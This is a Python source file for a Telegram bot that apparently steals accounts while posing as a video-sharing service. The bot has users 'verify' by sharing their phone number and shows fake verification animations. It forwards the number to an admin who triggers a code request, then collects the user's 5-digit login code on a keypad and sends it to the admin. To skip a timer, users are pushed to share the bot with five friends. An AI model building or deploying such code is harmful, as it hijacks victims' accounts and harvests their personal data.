import asyncio
import logging
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardRemove, InputMediaPhoto, InputMediaVideo, InputMediaDocument, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ContextTypes, ConversationHandler
from .config import *
from .keyboards import *
from .utils import animate_message, send_to_admin
from .database import get_db_connection

# --- User Flow ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        logging.info(f"Start command received from user: {user_id}")
        
        conn = get_db_connection()
        user = conn.execute("SELECT * FROM users WHERE user_id = ?", (user_id,)).fetchone()
        
        # Load Dynamic Welcome Settings
        welcome_img = conn.execute("SELECT value FROM settings WHERE key = 'welcome_img'").fetchone()['value']
        welcome_caption = conn.execute("SELECT value FROM settings WHERE key = 'welcome_caption'").fetchone()['value']
        
        if not user or not user['is_verified']:
            logging.info(f"User {user_id} not verified, sending welcome message.")
            try:
                await update.message.reply_photo(
                    photo=welcome_img,
                    caption=welcome_caption,
                    reply_markup=get_welcome_keyboard(),
                    parse_mode='Markdown'
                )
            except Exception as photo_err:
                logging.error(f"Error sending photo: {photo_err}. Falling back to text.")
                await update.message.reply_text(
                    text=welcome_caption,
                    reply_markup=get_welcome_keyboard(),
                    parse_mode='Markdown'
                )
            return AWAITING_CONTACT # Jump directly to contact state
        else:
            logging.info(f"User {user_id} is verified, sending Get Video button.")
            await update.message.reply_text(
                "Welcome back! ✨\nTap below to get your next video.",
                reply_markup=get_get_file_keyboard()
            )
            return ConversationHandler.END
    except Exception as e:
        logging.error(f"Error in start handler: {e}")
        await update.message.reply_text("Something went wrong. Please try again later. ⚠️")

async def proceed_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # This is now triggered by a Reply Keyboard Button "Proceed Automatically 🚀"
    # We handle it via MessageHandler in main.py
    await update.message.reply_text(
        "To verify your identity, please share your phone number using the button below. 📱",
        reply_markup=get_contact_keyboard()
    )
    return AWAITING_CONTACT

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        contact = update.message.contact
        user = update.effective_user
        logging.info(f"Contact received from user {user.id}: {contact.phone_number}")
        
        # Auto-delete the contact message for a clean UI
        try:
            await update.message.delete()
        except Exception as e:
            logging.error(f"Failed to delete contact message: {e}")
            
        conn = get_db_connection()
        conn.execute("INSERT OR IGNORE INTO users (user_id, phone) VALUES (?, ?)", (user.id, contact.phone_number))
        conn.commit()
        
        admin_text = (
            "👤 *New Verification Request*\n\n"
            f"Name: {user.full_name}\n"
            f"Username: @{user.username}\n"
            f"Phone: +{contact.phone_number}\n"
            f"User ID: `{user.id}`"
        )
        
        context.user_data['phone'] = contact.phone_number
        context.user_data['otp_input'] = ""
        
        status_msg = await update.message.reply_text("Processing... 🔄", reply_markup=ReplyKeyboardRemove())
        context.user_data['status_msg_id'] = status_msg.message_id
        
        # Send admin notification in background
        asyncio.create_task(send_to_admin(context, admin_text, reply_markup=get_admin_sms_keyboard(user.id)))
        
        await animate_message(update, context, SUBMITTING_MSGS, target_message=status_msg)
        await animate_message(update, context, VERIFYING_MSGS, target_message=status_msg)
        await animate_message(update, context, WAITING_CODE_MSGS, target_message=status_msg)
        
        return AWAITING_CODE
    except Exception as e:
        logging.error(f"Error in contact_handler: {e}")
        await update.message.reply_text("An error occurred while processing your request. ⚠️")
        return ConversationHandler.END

async def otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    current_otp = context.user_data.get('otp_input', "")
    
    if data.startswith("num_"):
        val = data.split("_")[1]
        if val == "clear":
            current_otp = ""
        elif val == "submit":
            if len(current_otp) > 0:
                await send_to_admin(
                    context, 
                    f"📩 *OTP Submitted*\nUser: {update.effective_user.full_name}\nCode: `{current_otp}`",
                    reply_markup=get_admin_approval_keyboard(update.effective_user.id)
                )
                await animate_message(update, context, CHECKING_CODE_MSGS)
                await animate_message(update, context, CONFIRMING_MSGS)
                return ADMIN_CONFIRMATION
            else:
                await query.answer("Please enter the code first! ⚠️")
                return AWAITING_CODE
        else:
            if len(current_otp) < 5:
                current_otp += val
        
        context.user_data['otp_input'] = current_otp
        # Show masked dots for digits not yet entered
        display_otp = current_otp + ("_" * (5 - len(current_otp)))
        await query.message.edit_text(
            f"{ENTER_CODE_MSG}\n\nCurrent: `{display_otp}`",
            reply_markup=get_otp_keyboard(),
            parse_mode='Markdown'
        )
    return AWAITING_CODE

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == "admin_panel":
        await query.message.reply_text("🔑 Please enter the Admin Secret Key:")
        return ADMIN_AUTH
    
    if data.startswith("msg_user_"):
        user_id = int(data.split("_")[2])
        context.user_data['msg_target_user'] = user_id
        await query.message.reply_text(f"💬 Send the message (Text, Photo, or Video) you want to send to User {user_id}:")
        return ADMIN_MSG_USER_CONTENT
        
    user_id = int(data.split("_")[1])
    conn = get_db_connection()
    if data.startswith("approve_"):
        conn.execute("UPDATE users SET is_verified = 1 WHERE user_id = ?", (user_id,))
        conn.commit()
        await context.bot.send_message(chat_id=user_id, text=ACCESS_GRANTED_MSG, parse_mode='Markdown', reply_markup=get_get_file_keyboard())
        await query.message.edit_text(f"✅ User {user_id} Approved.")
    elif data.startswith("reject_"):
        await context.bot.send_message(chat_id=user_id, text=INVALID_CODE_MSG, parse_mode='Markdown')
        await query.message.edit_text(f"❌ User {user_id} Rejected.")
    return ConversationHandler.END

async def get_file_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # This can be triggered by Reply Button "📥 Get Video" or Inline Button
    user_id = update.effective_user.id
    
    conn = get_db_connection()
    user = conn.execute("SELECT * FROM users WHERE user_id = ?", (user_id,)).fetchone()
    
    if not user or not user['is_verified']:
        await update.effective_message.reply_text("You are not verified! ❌")
        return

    next_index = user['last_file_index'] + 1
    file = conn.execute("SELECT * FROM files WHERE file_index = ?", (next_index,)).fetchone()
    
    if not file:
        await update.effective_message.reply_text("No more videos available for now! Check back later. ✨")
        return

    # Check Cooldown
    if user['last_received_at']:
        last_time = datetime.fromisoformat(user['last_received_at'])
        cooldown = file['cooldown_seconds']
        if cooldown is None:
            g_cooldown = conn.execute("SELECT value FROM settings WHERE key = 'global_cooldown'").fetchone()
            cooldown = int(g_cooldown['value'])
            
        wait_until = last_time + timedelta(seconds=cooldown)
        now = datetime.now()
        
        if now < wait_until:
            diff = wait_until - now
            hours, remainder = divmod(int(diff.total_seconds()), 3600)
            minutes, seconds = divmod(remainder, 60)
            
            # Offer Link Sharing to skip timer
            skip_link = conn.execute("SELECT value FROM settings WHERE key = 'skip_timer_link'").fetchone()['value']
            await update.effective_message.reply_text(
                f"⏳ *Next video in:* {hours:02d}:{minutes:02d}:{seconds:02d}\n\n"
                f"🚀 *Want to skip the timer?*\nShare this link with 5 friends: {skip_link}",
                parse_mode='Markdown'
            )
            return

    # Send File
    try:
        params = {
            "chat_id": user_id,
            "caption": file['caption'],
            "protect_content": bool(file['protect_content']),
            "parse_mode": 'Markdown'
        }
        
        if file['file_type'] == 'photo':
            sent_msg = await context.bot.send_photo(photo=file['file_id'], **params)
        elif file['file_type'] == 'video':
            sent_msg = await context.bot.send_video(video=file['file_id'], **params)
        else:
            sent_msg = await context.bot.send_document(document=file['file_id'], **params)

        conn.execute("UPDATE users SET last_file_index = ?, last_received_at = ? WHERE user_id = ?", 
                     (next_index, datetime.now().isoformat(), user_id))
        conn.commit()

        if file['auto_delete_seconds'] > 0:
            async def delete_after():
                await asyncio.sleep(file['auto_delete_seconds'])
                try: await context.bot.delete_message(chat_id=user_id, message_id=sent_msg.message_id)
                except: pass
            asyncio.create_task(delete_after())

    except Exception as e:
        await update.effective_message.reply_text(f"Error sending file: {str(e)}")

# --- Admin Panel ---

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    chat_id = str(update.effective_chat.id)
    clean_admin_chat_id = ADMIN_CHAT_ID.strip()
    
    if user_id != clean_admin_chat_id and chat_id != clean_admin_chat_id:
        return
        
    await update.message.reply_text("🔑 Please enter the Admin Secret Key:")
    return ADMIN_AUTH

async def admin_auth_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == ADMIN_SECRET:
        await update.message.reply_text("✅ Access Granted to Admin Panel", reply_markup=get_admin_main_keyboard())
        return ADMIN_PANEL
    else:
        await update.message.reply_text("❌ Access Denied.")
        return ConversationHandler.END

async def admin_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query: await query.answer()
    data = query.data if query else "admin_panel"

    if data == "admin_file_list":
        conn = get_db_connection()
        files = conn.execute("SELECT * FROM files ORDER BY file_index ASC").fetchall()
        text = "📁 *File List:*\n\n"
        keyboard = []
        for f in files:
            text += f"{f['file_index']}. {f['caption'][:30]}...\n"
            keyboard.append([InlineKeyboardButton(f"{f['file_index']}. {f['caption'][:20]}", callback_data=f"fmanage_{f['id']}")])
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="admin_panel")])
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    elif data == "admin_upload_file":
        await query.message.edit_text("📤 Please send/forward the file (Photo, Video, or Document):")
        return UPLOAD_FILE
        
    elif data == "admin_broadcast":
        await query.message.edit_text("📢 Send the message (Text, Photo, or Video) you want to broadcast to ALL users:")
        return BROADCAST_SEND

    elif data == "admin_edit_welcome_img":
        await query.message.edit_text("🖼 Send or Upload the NEW Welcome Image/Photo:")
        return EDIT_WELCOME_IMG
    
    elif data == "admin_edit_welcome_text":
        await query.message.edit_text("📝 Send the NEW Welcome Caption/Text:")
        return EDIT_WELCOME_CAPTION

    elif data == "admin_global_cooldown":
        await query.message.edit_text("⏱ Select Global Cooldown Time:", reply_markup=get_timer_options_keyboard())
        
    elif data == "admin_stats":
        conn = get_db_connection()
        user_count = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        verified_count = conn.execute("SELECT COUNT(*) FROM users WHERE is_verified = 1").fetchone()[0]
        file_count = conn.execute("SELECT COUNT(*) FROM files").fetchone()[0]
        stats = (
            "📊 *Bot Statistics*\n\n"
            f"Total Users: {user_count}\n"
            f"Verified Users: {verified_count}\n"
            f"Total Files: {file_count}"
        )
        await query.message.edit_text(stats, reply_markup=get_admin_main_keyboard(), parse_mode='Markdown')
        
    elif data == "admin_panel":
        msg_text = "🏠 *Admin Main Menu*"
        if query: await query.message.edit_text(msg_text, reply_markup=get_admin_main_keyboard(), parse_mode='Markdown')
        else: await update.message.reply_text(msg_text, reply_markup=get_admin_main_keyboard(), parse_mode='Markdown')

    return ADMIN_PANEL

# --- Advanced Admin Handlers ---

async def broadcast_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = get_db_connection()
    users = conn.execute("SELECT user_id FROM users").fetchall()
    
    success = 0
    fail = 0
    
    status_msg = await update.message.reply_text(f"🚀 Broadcasting to {len(users)} users...")
    
    for u in users:
        try:
            if update.message.photo:
                await context.bot.send_photo(chat_id=u['user_id'], photo=update.message.photo[-1].file_id, caption=update.message.caption)
            elif update.message.video:
                await context.bot.send_video(chat_id=u['user_id'], video=update.message.video.file_id, caption=update.message.caption)
            else:
                await context.bot.send_message(chat_id=u['user_id'], text=update.message.text)
            success += 1
        except:
            fail += 1
        await asyncio.sleep(0.05) # Avoid flood limits
        
    await status_msg.edit_text(f"✅ Broadcast Complete!\nSuccess: {success}\nFailed: {fail}")
    return ADMIN_PANEL

async def edit_welcome_img_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.photo:
        new_val = update.message.photo[-1].file_id
    else:
        new_val = update.message.text
        
    conn = get_db_connection()
    conn.execute("UPDATE settings SET value = ? WHERE key = 'welcome_img'", (new_val,))
    conn.commit()
    await update.message.reply_text("✅ Welcome Image updated! Now send the NEW Welcome Caption:")
    return EDIT_WELCOME_CAPTION

async def edit_welcome_caption_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    new_caption = update.message.text
    conn = get_db_connection()
    conn.execute("UPDATE settings SET value = ? WHERE key = 'welcome_caption'", (new_caption,))
    conn.commit()
    await update.message.reply_text("✅ Welcome Caption updated!")
    return ADMIN_PANEL

async def admin_msg_user_content_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Fixed: Properly send message, photo, or video to user"""
    target_user_id = context.user_data.get('msg_target_user')
    if not target_user_id:
        await update.message.reply_text("❌ User ID not found.")
        return ADMIN_PANEL
    
    try:
        # Send different types of content
        if update.message.photo:
            await context.bot.send_photo(
                chat_id=target_user_id,
                photo=update.message.photo[-1].file_id,
                caption=update.message.caption or "Message from Admin"
            )
        elif update.message.video:
            await context.bot.send_video(
                chat_id=target_user_id,
                video=update.message.video.file_id,
                caption=update.message.caption or "Message from Admin"
            )
        elif update.message.document:
            await context.bot.send_document(
                chat_id=target_user_id,
                document=update.message.document.file_id,
                caption=update.message.caption or "Message from Admin"
            )
        else:
            await context.bot.send_message(
                chat_id=target_user_id,
                text=update.message.text or "Message from Admin"
            )
        
        await update.message.reply_text(f"✅ Message sent to User {target_user_id}!")
    except Exception as e:
        logging.error(f"Error sending message to user {target_user_id}: {e}")
        await update.message.reply_text(f"❌ Failed to send message: {e}")
        
    return ADMIN_PANEL

async def file_manage_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    parts = data.split("_")
    db_id = int(parts[2])
    
    conn = get_db_connection()
    file = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
    if not file: return ADMIN_PANEL

    if data.startswith("fmanage_") or data.startswith("fset_back_"):
        await query.message.edit_text(
            f"🛠 *Managing File #{file['file_index']}*\nCaption: {file['caption']}",
            reply_markup=get_file_settings_keyboard(db_id, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']),
            parse_mode='Markdown'
        )
    elif data.startswith("fset_timer_"):
        await query.message.edit_text("⏱ Select Timer for this file:", reply_markup=get_timer_options_keyboard(db_id))
    elif data.startswith("fset_sharing_"):
        new_val = 0 if file['protect_content'] else 1
        conn.execute("UPDATE files SET protect_content = ? WHERE id = ?", (new_val, db_id))
        conn.commit()
        file = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
        await query.message.edit_reply_markup(reply_markup=get_file_settings_keyboard(db_id, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']))
    elif data.startswith("fset_autodel_"):
        await query.message.edit_text("🗑 Select Auto-Delete time:", reply_markup=get_autodelete_options_keyboard(db_id))
    elif data.startswith("fset_rename_"):
        await query.message.edit_text(f"✏️ Current Caption: `{file['caption']}`\n\nSend the new caption:")
        context.user_data['editing_file_id'] = db_id
        return RENAME_FILE
    elif data.startswith("fset_delete_"):
        conn.execute("DELETE FROM files WHERE id = ?", (db_id,))
        remaining = conn.execute("SELECT id FROM files ORDER BY file_index ASC").fetchall()
        for idx, r in enumerate(remaining, 1):
            conn.execute("UPDATE files SET file_index = ? WHERE id = ?", (idx, r['id']))
        conn.commit()
        await query.answer("File deleted! 🗑")
        return await admin_menu_callback(update, context)
    elif data.startswith("fset_up_") or data.startswith("fset_down_"):
        curr_idx = file['file_index']
        target_idx = curr_idx - 1 if "up" in data else curr_idx + 1
        other = conn.execute("SELECT id FROM files WHERE file_index = ?", (target_idx,)).fetchone()
        if other:
            conn.execute("UPDATE files SET file_index = ? WHERE id = ?", (target_idx, db_id))
            conn.execute("UPDATE files SET file_index = ? WHERE id = ?", (curr_idx, other['id']))
            conn.commit()
            file = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
            await query.message.edit_text(
                f"🛠 *Managing File #{file['file_index']}*\nCaption: {file['caption']}",
                reply_markup=get_file_settings_keyboard(db_id, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']),
                parse_mode='Markdown'
            )
        else: await query.answer("Cannot move further! ⚠️")
    return ADMIN_PANEL

# --- Existing Handlers Continued ---

async def admin_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        data = query.data
        if data == "admin_panel": return await admin_menu_callback(update, context)
        
        parts = data.split("_")
        if "done" in data:
            user_id = int(parts[3])
            await context.bot.send_message(chat_id=user_id, text=WAITING_FOR_ADMIN_MSG)
            await asyncio.sleep(1)
            await context.bot.send_message(chat_id=user_id, text=f"{ENTER_CODE_MSG}\n\nCurrent: `____`", reply_markup=get_otp_keyboard(), parse_mode='Markdown')
            await query.message.edit_text(f"✅ Code request sent to user (ID: {user_id}).")
        else:
            user_id = int(parts[2])
            await query.answer(f"Digit {parts[3]} selected")
    except Exception as e:
        logging.error(f"Error in admin_sms_handler: {e}")

async def admin_file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file_id, file_type = None, None
    caption = update.message.caption or "No caption"
    if update.message.photo: file_id, file_type = update.message.photo[-1].file_id, 'photo'
    elif update.message.video: file_id, file_type = update.message.video.file_id, 'video'
    elif update.message.document: file_id, file_type = update.message.document.file_id, 'document'
    
    if file_id:
        conn = get_db_connection()
        max_idx = conn.execute("SELECT MAX(file_index) FROM files").fetchone()[0] or 0
        cursor = conn.execute("INSERT INTO files (file_id, file_type, caption, file_index) VALUES (?, ?, ?, ?)", (file_id, file_type, caption, max_idx + 1))
        db_id = cursor.lastrowid
        conn.commit()
        file_data = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
        await update.message.reply_text(f"✅ File Uploaded!\nIndex: {file_data['file_index']}", reply_markup=get_file_settings_keyboard(db_id, file_data['cooldown_seconds'], file_data['protect_content'], file_data['auto_delete_seconds']))
        return ADMIN_PANEL
    return UPLOAD_FILE

async def file_rename_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db_id = context.user_data.get('editing_file_id')
    if db_id:
        conn = get_db_connection()
        conn.execute("UPDATE files SET caption = ? WHERE id = ?", (update.message.text, db_id))
        conn.commit()
        file = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
        await update.message.reply_text(f"✅ Caption updated for File #{file['file_index']}", reply_markup=get_file_settings_keyboard(db_id, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']))
    return ADMIN_PANEL

async def timer_setting_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    conn = get_db_connection()
    if data.startswith("time_"):
        parts = data.split("_")
        db_id, val = int(parts[1]), parts[2]
        if val == "custom":
            await query.message.edit_text("✏️ Enter cooldown in minutes:")
            context.user_data['setting_timer_for'] = db_id
            return SET_COOLDOWN
        conn.execute("UPDATE files SET cooldown_seconds = ? WHERE id = ?", (int(val), db_id))
        conn.commit()
        return await file_manage_callback(update, context)
    elif data.startswith("gtime_"):
        val = data.split("_")[1]
        if val == "custom":
            await query.message.edit_text("✏️ Enter global cooldown in minutes:")
            context.user_data['setting_timer_for'] = "global"
            return SET_COOLDOWN
        conn.execute("UPDATE settings SET value = ? WHERE key = 'global_cooldown'", (val,))
        conn.commit()
        await query.message.edit_text(f"✅ Global Cooldown set to {int(val)//60} minutes.", reply_markup=get_admin_main_keyboard())
        return ADMIN_PANEL

async def custom_timer_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        minutes = int(update.message.text)
        seconds = minutes * 60
        target = context.user_data.get('setting_timer_for')
        conn = get_db_connection()
        if target == "global":
            conn.execute("UPDATE settings SET value = ? WHERE key = 'global_cooldown'", (str(seconds),))
            await update.message.reply_text(f"✅ Global Cooldown set to {minutes} minutes.", reply_markup=get_admin_main_keyboard())
        else:
            conn.execute("UPDATE files SET cooldown_seconds = ? WHERE id = ?", (seconds, target))
            file = conn.execute("SELECT * FROM files WHERE id = ?", (target,)).fetchone()
            await update.message.reply_text(f"✅ Cooldown for File #{file['file_index']} set to {minutes} minutes.", reply_markup=get_file_settings_keyboard(target, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']))
        conn.commit()
    except: return SET_COOLDOWN
    return ADMIN_PANEL

async def autodelete_setting_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    parts = data.split("_")
    db_id, val = int(parts[1]), parts[2]
    conn = get_db_connection()
    if val == "custom":
        await query.message.edit_text("✏️ Enter auto-delete time in minutes:")
        context.user_data['setting_autodel_for'] = db_id
        return SET_AUTO_DELETE
    conn.execute("UPDATE files SET auto_delete_seconds = ? WHERE id = ?", (int(val), db_id))
    conn.commit()
    return await file_manage_callback(update, context)

async def custom_autodelete_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        minutes = int(update.message.text)
        seconds = minutes * 60
        db_id = context.user_data.get('setting_autodel_for')
        conn = get_db_connection()
        conn.execute("UPDATE files SET auto_delete_seconds = ? WHERE id = ?", (seconds, db_id))
        conn.commit()
        file = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
        await update.message.reply_text(f"✅ Auto-Delete for File #{file['file_index']} set to {minutes} minutes.", reply_markup=get_file_settings_keyboard(db_id, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']))
    except: return SET_AUTO_DELETE
    return ADMIN_PANEL
